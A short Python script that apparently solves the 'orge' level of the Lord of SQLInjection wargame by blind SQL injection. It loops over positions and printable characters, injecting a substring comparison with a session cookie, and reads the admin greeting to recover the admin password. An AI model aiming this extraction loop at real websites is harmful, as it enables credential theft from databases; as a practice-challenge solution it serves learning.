import requests
import time

URL="https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"

params = {'pw':''}

cookie={
    "PHPSESSID":"m6svmk60lvo3rlrb93bftic7cv"
    }

password = ''
for i in range(8):
    print(i, end=' ')
    for j in range(32, 127):
        params['pw'] = "'||id='admin'&&substring(pw,{},1)='{}'-- ".format(i+1, chr(j))
        res = requests.get(URL, params=params, cookies=cookie)
        #print(i, j, res.text)
        if "Hello admin" in res.text:
            print("found!:{} : {}".format(i, chr(j)))
            password += chr(j)
            break

print(password)
